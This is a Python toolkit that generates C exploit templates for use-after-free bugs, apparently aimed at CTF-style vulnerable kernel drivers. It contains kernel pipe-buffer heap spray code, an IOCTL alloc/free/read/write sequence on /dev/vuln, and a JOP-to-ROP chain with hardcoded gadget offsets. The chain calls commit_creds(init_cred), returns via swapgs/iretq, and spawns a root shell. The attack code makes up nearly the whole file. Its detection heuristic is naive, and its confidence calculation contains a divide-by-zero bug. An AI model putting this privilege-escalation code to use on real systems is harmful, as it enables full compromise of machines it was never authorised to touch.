#!/usr/bin/env python3

"""
Advanced Use-After-Free (UAF) Exploitation Techniques
Sophisticated UAF methods including pipe spray and kernel ROP chains
"""

import struct
import os
import sys
from pathlib import Path

class AdvancedUAFTechniques:
    """Advanced UAF exploitation techniques for kernel and userspace"""
    
    def __init__(self):
        self.uaf_techniques = {
            "kernel_uaf_pipes": self.kernel_uaf_with_pipe_spray,
            "ioctl_uaf_sequence": self.ioctl_uaf_exploitation,
            "heap_spray_uaf": self.heap_spray_uaf_technique,
            "jop_rop_chain": self.jop_to_rop_chain_exploit
        }
        
        # Kernel gadgets (example addresses - would be calculated dynamically)
        self.kernel_gadgets = {
            'PUSH_RSI_JMP_RSI_44': 0xd4ad2a,
            'POP_RSP_RET': 0xeadf45,
            'ADD_RSP_0x48_RET': 0xea7e12,
            'POP_RDI': 0xeaf204,
            'COMMIT_CREDS': 0xb9970,
            'INIT_CRED': 0x1a52fc0,
            'SWAPGS': 0x100180c,
            'IRETQ': 0x1001ce6
        }
        
        # IOCTL commands for common vulnerable drivers
        self.ioctl_commands = {
            'ALLOC': 0x40084200,    # _IOW(0x42, 0, size_t)
            'FREE': 0x4201,         # _IO(0x42, 1)
            'USE_READ': 0x80084202, # _IOR(0x42, 2, char)
            'USE_WRITE': 0x40084202 # _IOW(0x42, 2, char)
        }
        
        print("[+] Advanced UAF Techniques initialized")
    
    def detect_uaf_vulnerability(self, binary_path):
        """Detect UAF vulnerability patterns in binary"""
        try:
            with open(binary_path, 'rb') as f:
                content = f.read()
            
            uaf_indicators = [
                b"use-after-free", b"UAF", b"free", b"kfree",
                b"pipe", b"ioctl", b"alloc", b"malloc",
                b"_IOW", b"_IOR", b"_IO", b"/dev/",
                b"commit_creds", b"init_cred", b"SWAPGS"
            ]
            
            detected_patterns = []
            for indicator in uaf_indicators:
                if indicator in content:
                    detected_patterns.append(indicator.decode('utf-8', errors='ignore'))
            
            if len(detected_patterns) >= 4:
                print(f"[+] UAF vulnerability detected with patterns: {detected_patterns}")
                return True, detected_patterns
            
            return False, []
            
        except Exception as e:
            print(f"[-] Error detecting UAF vulnerability: {e}")
            return False, []
    
    def kernel_uaf_with_pipe_spray(self, pipe_count=1000, trigger_pipes=20):
        """
        Kernel UAF exploitation using pipe buffer spray technique
        Creates reliable heap layout for UAF exploitation
        """
        print(f"[+] Crafting kernel UAF exploit with {pipe_count} pipe spray...")
        
        # Phase 1: Pipe spray setup
        pipe_spray_code = f"""
        // Create {pipe_count} pipes for heap spray
        int pipes[{pipe_count}][2];
        int trigger_pipes[{trigger_pipes}][2];
        
        // Spray pipe buffers to control heap layout
        char *spray_data = malloc(0x1000);
        memset(spray_data, 'A', 0x1000);
        
        for (int i = 0; i < {pipe_count}; i++) {{
            if (pipe(pipes[i]) == -1) {{
                perror("pipe spray failed");
                return -1;
            }}
            
            // Write data to allocate pipe_buffer structures
            if (write(pipes[i][1], spray_data, 0x1000) != 0x1000) {{
                perror("pipe spray write failed");
                return -1;
            }}
        }}
        
        // Create trigger pipes for ROP execution
        for (int i = 0; i < {trigger_pipes}; i++) {{
            if (pipe(trigger_pipes[i]) == -1) {{
                perror("trigger pipe failed");
                return -1;
            }}
            
            char trigger_data[0x1000];
            memset(trigger_data, 'T', sizeof(trigger_data));
            write(trigger_pipes[i][1], trigger_data, sizeof(trigger_data));
        }}
        """
        
        # Phase 2: UAF trigger sequence
        uaf_trigger_code = """
        // IOCTL sequence to trigger UAF
        int fd = open("/dev/vuln", O_RDWR);
        size_t alloc_size = 1024;
        
        // 1. Allocate kernel object
        ioctl(fd, ALLOC, &alloc_size);
        
        // 2. Write initial data
        char write_data[100] = "Initial data";
        ioctl(fd, USE_WRITE, write_data);
        
        // 3. Free the object (creates UAF condition)
        ioctl(fd, FREE);
        
        // 4. Read freed memory to get leaks
        char read_buffer[2048];
        memset(read_buffer, 0, sizeof(read_buffer));
        ioctl(fd, USE_READ, read_buffer);
        """
        
        # Phase 3: Kernel address leak extraction
        leak_extraction_code = """
        // Extract kernel addresses from leaked data
        uint64_t extract_address(const char *data, size_t offset) {
            if (offset + 8 > 2048) return 0;
            return *(uint64_t *)(data + offset);
        }
        
        uint64_t kernel_leak = extract_address(read_buffer, 0x10);
        uint64_t kernel_base = kernel_leak - 0x121ec40;  // Adjust offset
        uint64_t buffer_leak = extract_address(read_buffer, 0x200);
        uint64_t controlled_buffer = buffer_leak - 0x400;
        
        printf("[!] Kernel leak: 0x%016llx\\n", kernel_leak);
        printf("[!] Kernel base: 0x%016llx\\n", kernel_base);
        printf("[!] Controlled buffer: 0x%016llx\\n", controlled_buffer);
        """
        
        # Phase 4: JOP->ROP chain construction
        rop_chain = self.build_kernel_rop_chain()
        
        exploit_structure = {
            "pipe_spray": pipe_spray_code,
            "uaf_trigger": uaf_trigger_code,
            "leak_extraction": leak_extraction_code,
            "rop_chain": rop_chain,
            "pipe_count": pipe_count,
            "trigger_pipes": trigger_pipes
        }
        
        return exploit_structure
    
    def build_kernel_rop_chain(self):
        """Build kernel ROP chain for privilege escalation"""
        print("[+] Building kernel ROP chain with KPTI bypass...")
        
        rop_chain_code = """
        // Build JOP->ROP chain for privilege escalation
        char rop_payload[1024];
        memset(rop_payload, 0, sizeof(rop_payload));
        
        // Calculate gadget addresses
        uint64_t jop_gadget = kernel_base + 0xd4ad2a;      // PUSH_RSI_JMP_RSI_44
        uint64_t pop_rsp_ret = kernel_base + 0xeadf45;     // pop rsp; ret
        uint64_t pop_rdi = kernel_base + 0xeaf204;         // pop rdi; ret
        uint64_t commit_creds = kernel_base + 0xb9970;     // commit_creds
        uint64_t init_cred = kernel_base + 0x1a52fc0;      // init_cred
        uint64_t swapgs = kernel_base + 0x100180c;         // swapgs
        uint64_t iretq = kernel_base + 0x1001ce6;          // iretq
        uint64_t add_rsp_48 = kernel_base + 0xea7e12;      // add rsp, 0x48; ret
        
        // Setup fake pipe_buffer for JOP
        uint64_t fake_pipe_buffer_addr = controlled_buffer;
        *(uint64_t *)(rop_payload + 0x10) = fake_pipe_buffer_addr + 0x100;
        *(uint64_t *)(rop_payload + 0x100 + 0x08) = jop_gadget;
        *(uint64_t *)(rop_payload + 0x44) = pop_rsp_ret;
        *(uint64_t *)(rop_payload + 0x00) = add_rsp_48;
        
        // Build ROP chain
        uint64_t *rop = (uint64_t *)(rop_payload + 0x48 + 8);
        
        *rop++ = pop_rdi;               // pop rdi; ret
        *rop++ = init_cred;             // init_cred address
        *rop++ = commit_creds;          // commit_creds(init_cred)
        
        // KPTI trampoline for clean return to userspace
        *rop++ = swapgs;                // swapgs
        *rop++ = iretq;                 // iretq
        
        // User context for clean return
        *rop++ = (uint64_t)get_shell;   // user rip
        *rop++ = user_cs;               // user cs
        *rop++ = user_rflags;           // user rflags  
        *rop++ = user_sp;               // user rsp
        *rop++ = user_ss;               // user ss
        """
        
        return rop_chain_code
    
    def ioctl_uaf_exploitation(self, device_path="/dev/vuln"):
        """
        IOCTL-based UAF exploitation sequence
        Standard pattern: ALLOC -> WRITE -> FREE -> READ -> WRITE
        """
        print(f"[+] Crafting IOCTL UAF exploitation for {device_path}...")
        
        ioctl_sequence = f"""
        #include <sys/ioctl.h>
        #include <fcntl.h>
        
        #define K1_TYPE 0xB9
        #define ALLOC _IOW(K1_TYPE, 0, size_t)
        #define FREE _IO(K1_TYPE, 1)
        #define USE_READ _IOR(K1_TYPE, 2, char)
        #define USE_WRITE _IOW(K1_TYPE, 2, char)
        
        int exploit_ioctl_uaf() {{
            int fd = open("{device_path}", O_RDWR);
            if (fd < 0) {{
                perror("open device");
                return -1;
            }}
            
            // Phase 1: Allocate kernel object
            size_t alloc_size = 1024;
            printf("[+] Allocating buffer of size %zu\\n", alloc_size);
            if (ioctl(fd, ALLOC, &alloc_size) < 0) {{
                perror("ALLOC ioctl");
                return -1;
            }}
            
            // Phase 2: Write controlled data
            char write_data[100];
            strcpy(write_data, "Controlled payload data");
            printf("[+] Writing controlled data\\n");
            if (ioctl(fd, USE_WRITE, write_data) < 0) {{
                perror("USE_WRITE ioctl");
                return -1;
            }}
            
            // Phase 3: Free object (creates UAF)
            printf("[+] Freeing object (creating UAF condition)\\n");
            if (ioctl(fd, FREE) < 0) {{
                perror("FREE ioctl");
                return -1;
            }}
            
            // Phase 4: Read freed memory (UAF read)
            char read_buffer[2048];
            memset(read_buffer, 0, sizeof(read_buffer));
            printf("[+] Reading freed memory (UAF)\\n");
            if (ioctl(fd, USE_READ, read_buffer) < 0) {{
                perror("USE_READ ioctl after free");
                return -1;
            }}
            
            // Phase 5: Analyze leaked data
            hexdump(read_buffer, 512);
            
            // Phase 6: Write ROP chain to freed memory (UAF write)
            char rop_payload[1024];
            build_rop_chain(rop_payload, sizeof(rop_payload));
            printf("[+] Writing ROP chain to freed memory\\n");
            if (ioctl(fd, USE_WRITE, rop_payload) < 0) {{
                perror("USE_WRITE ROP payload");
                return -1;
            }}
            
            close(fd);
            return 0;
        }}
        """
        
        return ioctl_sequence
    
    def heap_spray_uaf_technique(self, spray_size=0x1000, spray_count=100):
        """
        Heap spray technique for UAF exploitation
        Creates predictable heap layout for reliable exploitation
        """
        print(f"[+] Crafting heap spray UAF with {spray_count} allocations...")
        
        heap_spray_code = f"""
        // Heap spray for UAF exploitation
        #define SPRAY_SIZE {spray_size}
        #define SPRAY_COUNT {spray_count}
        
        int heap_spray_uaf() {{
            void *spray_chunks[SPRAY_COUNT];
            char *spray_data = malloc(SPRAY_SIZE);
            
            // Fill spray data with pattern
            memset(spray_data, 0x41, SPRAY_SIZE);
            
            // Phase 1: Initial heap spray
            printf("[+] Performing initial heap spray...\\n");
            for (int i = 0; i < SPRAY_COUNT; i++) {{
                spray_chunks[i] = malloc(SPRAY_SIZE);
                if (spray_chunks[i]) {{
                    memcpy(spray_chunks[i], spray_data, SPRAY_SIZE);
                }}
            }}
            
            // Phase 2: Create holes in heap layout
            printf("[+] Creating holes in heap layout...\\n");
            for (int i = 0; i < SPRAY_COUNT; i += 2) {{
                free(spray_chunks[i]);
                spray_chunks[i] = NULL;
            }}
            
            // Phase 3: Trigger UAF vulnerability
            printf("[+] Triggering UAF vulnerability...\\n");
            void *vulnerable_chunk = malloc(SPRAY_SIZE);
            strcpy((char*)vulnerable_chunk, "Vulnerable data");
            
            // Free the vulnerable chunk
            free(vulnerable_chunk);
            
            // Phase 4: Reallocate with controlled data
            printf("[+] Reallocating with controlled data...\\n");
            void *controlled_chunk = malloc(SPRAY_SIZE);
            if (controlled_chunk == vulnerable_chunk) {{
                printf("[+] Successfully reallocated same chunk!\\n");
                
                // Write ROP chain or shellcode
                build_exploit_payload((char*)controlled_chunk, SPRAY_SIZE);
            }}
            
            // Phase 5: Trigger use of freed memory
            printf("[+] Triggering use of freed memory...\\n");
            // This would trigger the UAF condition
            // trigger_vulnerable_use(vulnerable_chunk);
            
            free(spray_data);
            return 0;
        }}
        """
        
        return heap_spray_code
    
    def jop_to_rop_chain_exploit(self):
        """
        JOP to ROP chain transition exploit
        Uses JOP gadgets to pivot to ROP chain
        """
        print("[+] Building JOP to ROP chain transition...")
        
        jop_rop_code = """
        // JOP to ROP chain transition exploit
        void build_jop_rop_transition(char *payload, size_t payload_size) {
            memset(payload, 0, payload_size);
            
            // JOP gadget setup
            // PUSH_RSI_JMP_RSI_44 gadget allows us to control RSI and jump
            uint64_t jop_gadget = kernel_base + 0xd4ad2a;
            uint64_t stack_pivot = kernel_base + 0xeadf45;  // pop rsp; ret
            
            // Setup fake object for JOP
            uint64_t fake_object_addr = controlled_buffer + 0x100;
            
            // Write fake object pointer
            *(uint64_t *)(payload + 0x10) = fake_object_addr;
            
            // Write JOP gadget at fake object + 0x08 (function pointer)
            *(uint64_t *)(payload + 0x100 + 0x08) = jop_gadget;
            
            // Write stack pivot address at JOP target + 0x44
            *(uint64_t *)(payload + 0x44) = stack_pivot;
            
            // Setup ROP chain after stack pivot
            uint64_t *rop_chain = (uint64_t *)(payload + 0x48 + 8);
            
            // Standard privilege escalation ROP chain
            *rop_chain++ = kernel_base + 0xeaf204;  // pop rdi; ret
            *rop_chain++ = kernel_base + 0x1a52fc0; // init_cred
            *rop_chain++ = kernel_base + 0xb9970;   // commit_creds
            
            // KPTI bypass sequence
            *rop_chain++ = kernel_base + 0x100180c; // swapgs
            *rop_chain++ = kernel_base + 0x1001ce6; // iretq
            
            // User context
            *rop_chain++ = (uint64_t)get_shell;     // user rip
            *rop_chain++ = user_cs;                 // user cs
            *rop_chain++ = user_rflags;             // user rflags
            *rop_chain++ = user_sp;                 // user rsp
            *rop_chain++ = user_ss;                 // user ss
        }
        
        // Trigger JOP->ROP chain execution
        void trigger_jop_rop_chain() {
            printf("[+] Triggering JOP->ROP chain execution...\\n");
            
            // This would typically involve:
            // 1. Triggering the vulnerable function call
            // 2. The function dereferences our controlled pointer
            // 3. JOP gadget executes and pivots stack
            // 4. ROP chain executes for privilege escalation
            
            // Example trigger (depends on vulnerability):
            // close_trigger_pipes();  // For pipe-based triggers
            // or
            // trigger_vulnerable_callback();  // For callback-based triggers
        }
        """
        
        return jop_rop_code
    
    def generate_uaf_exploit_template(self, vuln_type="ioctl"):
        """Generate complete UAF exploit template"""
        print(f"[+] Generating UAF exploit template for {vuln_type}...")
        
        template_header = """
        #define _GNU_SOURCE
        #include <fcntl.h>
        #include <sys/ioctl.h>
        #include <sys/msg.h>
        #include <sys/socket.h>
        #include <sys/types.h>
        #include <unistd.h>
        #include <sys/ipc.h>
        #include <stdio.h>
        #include <stdlib.h>
        #include <string.h>
        #include <errno.h>
        #include <stdint.h>
        #include <signal.h>
        #include <sys/wait.h>
        #include <sys/mman.h>
        
        typedef uint64_t u64;
        
        // User state preservation
        u64 user_cs, user_ss, user_rflags, user_sp;
        
        void save_state() {
            __asm__("movq %%cs, %0" : "=r" (user_cs));
            __asm__("movq %%ss, %0" : "=r" (user_ss));
            __asm__("pushfq; popq %0" : "=r" (user_rflags));
            __asm__("movq %%rsp, %0" : "=r" (user_sp));
        }
        
        void get_shell() {
            printf("[+] Got root shell!\\n");
            system("/bin/sh");
            exit(0);
        }
        
        void hexdump(const char *data, size_t len) {
            for (size_t i = 0; i < len; i++) {
                if (i % 16 == 0) printf("%04zx: ", i);
                printf("%02x ", (unsigned char)data[i]);
                if (i % 16 == 15) {
                    printf(" |");
                    for (size_t j = i - 15; j <= i; j++) {
                        char c = data[j];
                        printf("%c", (c >= 32 && c <= 126) ? c : '.');
                    }
                    printf("|\\n");
                }
            }
            if (len % 16 != 0) printf("\\n");
        }
        
        u64 extract_address(const char *data, size_t offset) {
            if (offset + 8 > 2048) return 0;
            return *(u64 *)(data + offset);
        }
        """
        
        if vuln_type == "ioctl":
            main_exploit = self.ioctl_uaf_exploitation()
        elif vuln_type == "kernel_pipes":
            main_exploit = self.kernel_uaf_with_pipe_spray()
        else:
            main_exploit = self.heap_spray_uaf_technique()
        
        template = {
            "header": template_header,
            "main_exploit": main_exploit,
            "vuln_type": vuln_type
        }
        
        return template
    
    def analyze_uaf_exploitability(self, binary_path):
        """Analyze UAF exploitability and recommend techniques"""
        print("[+] Analyzing UAF exploitability...")
        
        detected, patterns = self.detect_uaf_vulnerability(binary_path)
        if not detected:
            return {"exploitable": False, "techniques": []}
        
        techniques = []
        
        # Check for kernel UAF indicators
        if any(pattern in ["ioctl", "/dev/", "commit_creds"] for pattern in patterns):
            techniques.append({
                "name": "Kernel UAF with Pipe Spray",
                "priority": "high",
                "description": "Use pipe buffer spray for reliable kernel UAF exploitation",
                "method": "kernel_uaf_with_pipe_spray"
            })
        
        # Check for IOCTL patterns
        if any(pattern in ["ioctl", "_IOW", "_IOR"] for pattern in patterns):
            techniques.append({
                "name": "IOCTL UAF Sequence",
                "priority": "high", 
                "description": "Standard IOCTL UAF exploitation sequence",
                "method": "ioctl_uaf_exploitation"
            })
        
        # Check for heap patterns
        if any(pattern in ["malloc", "free", "alloc"] for pattern in patterns):
            techniques.append({
                "name": "Heap Spray UAF",
                "priority": "medium",
                "description": "Heap spray technique for UAF exploitation",
                "method": "heap_spray_uaf_technique"
            })
        
        # Check for JOP/ROP patterns
        if any(pattern in ["gadget", "rop", "jop"] for pattern in patterns):
            techniques.append({
                "name": "JOP to ROP Chain",
                "priority": "high",
                "description": "JOP to ROP chain transition for complex exploitation",
                "method": "jop_to_rop_chain_exploit"
            })
        
        return {
            "exploitable": True,
            "patterns": patterns,
            "techniques": techniques,
            "confidence": len(patterns) / len(self.detect_uaf_vulnerability.__defaults__ or [])
        }

def main():
    """Test Advanced UAF techniques"""
    print("Advanced UAF Exploitation Techniques Test")
    print("=" * 50)
    
    uaf_exploiter = AdvancedUAFTechniques()
    
    # Test detection
    test_binary = "test_uaf_challenge"
    analysis = uaf_exploiter.analyze_uaf_exploitability(test_binary)
    
    if analysis["exploitable"]:
        print(f"[+] UAF vulnerability detected with confidence: {analysis['confidence']:.2f}")
        print(f"[+] Detected patterns: {analysis['patterns']}")
        
        print("\n[+] Recommended techniques:")
        for i, technique in enumerate(analysis["techniques"], 1):
            print(f"{i}. {technique['name']} (Priority: {technique['priority']})")
            print(f"   Description: {technique['description']}")
        
        # Test kernel UAF with pipes
        print("\n[+] Testing kernel UAF with pipe spray...")
        kernel_exploit = uaf_exploiter.kernel_uaf_with_pipe_spray()
        print(f"[+] Generated kernel exploit with {kernel_exploit['pipe_count']} pipes")
        
        # Test IOCTL UAF
        print("\n[+] Testing IOCTL UAF sequence...")
        ioctl_exploit = uaf_exploiter.ioctl_uaf_exploitation()
        print("[+] Generated IOCTL UAF exploitation sequence")
        
        # Generate complete exploit template
        print("\n[+] Generating complete exploit template...")
        template = uaf_exploiter.generate_uaf_exploit_template("kernel_pipes")
        print(f"[+] Generated template for {template['vuln_type']} exploitation")
    
    else:
        print("[-] No UAF vulnerability detected")
    
    print("\n[+] Advanced UAF techniques test completed!")

if __name__ == "__main__":
    main()